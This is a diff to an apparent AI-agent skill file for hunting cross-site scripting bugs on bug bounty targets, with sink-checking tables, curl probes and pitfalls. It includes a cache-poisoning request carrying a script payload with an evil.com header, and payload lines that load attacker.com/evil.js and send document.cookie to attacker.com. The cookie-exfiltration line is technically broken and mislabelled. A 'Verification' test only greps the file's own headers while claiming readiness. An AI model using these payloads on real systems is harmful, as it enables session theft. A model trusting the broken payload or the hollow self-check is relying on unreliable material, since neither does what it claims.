@@ -1,13 +1,45 @@
 ---
 name: hunt-xss
 description: "Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target."
-sources: github, hackerone_public
-report_count: 174
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [xss, hunt, redteam]
 ---
 
 ## When to Use
 
 Use when the target has any endpoint where user input is reflected in HTML output, processed by a JavaScript framework, or stored for later display. XSS is the foundational client-side vulnerability class — it enables session hijacking, data theft, phishing, and account takeover. Every form, search field, URL parameter, file upload, and user-controlled field is a candidate. Highest-value targets: admin panels, OAuth sign-in pages, markdown/wiki renderers, email templates, file upload endpoints (SVG/HTML), and help/documentation sites with looser security posture.
+
+### ⚠️ CRITICAL: Presence ≠ Exploitation
+
+**Reflection of HTML tags does NOT mean XSS is exploitable.** Modern frameworks escape text by default. Before calling a finding XSS, you MUST verify the sink:
+
+| Framework | Default Behavior | XSS Possible Only With |
+|-----------|-----------------|----------------------|
+| React/JSX | Escapes all text | `dangerouslySetInnerHTML`, `innerHTML` on refs |
+| Vue | Escapes `{{ }}` | `v-html` directive |
+| Angular | Escapes `{{ }}` | `[innerHTML]` binding |
+| Svelte | Escapes `{ }` | `{@html}` tag |
+| Next.js RSC | Escapes JSX text | `dangerouslySetInnerHTML` in components |
+| Plain HTML/JS | Does NOT escape | `innerHTML`, `document.write()`, `eval()` |
+
+**XSS verification checklist:**
+1. ✅ Payload is REFLECTED/STORED in response (presence)
+2. ✅ Payload appears in a RENDERABLE context (sink check)
+3. ✅ Payload EXECUTES in browser (proof of exploitation)
+
+If step 1 passes but step 2 fails → **LOW: HTML storage without exploitable sink**. The React ecosystem alone prevents ~90% of apparent XSS because JSX auto-escapes.
+
+**How to Check for Sinks:**
+```bash
+# In JS bundles — search for dangerous rendering patterns
+grep -rPn 'dangerouslySetInnerHTML|innerHTML|outerHTML|v-html|\[innerHTML\]|\{@html\}|insertAdjacentHTML|document\.write\(|eval\(' /tmp/target_js/
+
+# If NONE appear near the reflected field → NOT exploitable XSS
+# If found → verify the specific field reaches that sink
+```
 
 ## Crown Jewel Targets
 
@@ -216,15 +248,15 @@ grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include
 
 **Curl to detect reflection:**
 ```bash
-curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
-curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
 ```
 
 **Cache poisoning test:**
 ```bash
 # Send payload then fetch with clean session to see if cached
-curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
-curl -sk "https://target.com/page" | grep -i "evil.com"
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page" | grep -i "evil.com"
 ```
 
 ---
@@ -396,6 +428,39 @@ Cross-references:
 
 ---
 
+## Verification
+
+Run this self-test to confirm xss hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-xss" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Self-XSS** — XSS that only affects the attacker's own session is informational. Need stored XSS or reflected XSS affecting other users.
+- **XSS without HttpOnly bypass** — if the session cookie is HttpOnly, XSS can't steal it. Need to demonstrate impact via other means (CSRF token theft, keylogging, page modification).
+- **DOM XSS without exploitable sink** — `location.hash` reaching `innerHTML` is exploitable. `location.hash` reaching `console.log` is not.
+- **CSP bypass without XSS** — finding a CSP bypass technique is not a vulnerability without working XSS to bypass. Distinguish the two.
+- **MIME-type confusion** — uploading HTML as image/png that renders as HTML is MIME confusion, not classic XSS. May be blocked by X-Content-Type-Options.
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
@@ -403,3 +468,9 @@ Cross-references:
 - **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
 - **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
 - **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.
+
+### Phase X — CSP Bypass & Framework Sinks
+
+CSP bypass via import map injection: `<script type="importmap">{"imports":{"app":"https://attacker.com/evil.js"}}</script>`
+Trusted Types bypass via CSS exfiltration: `<style>@import url('https://attacker.com/?'+document.cookie);</style>`
+Framework sinks: React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `[innerHTML]`, Svelte `{@html}`
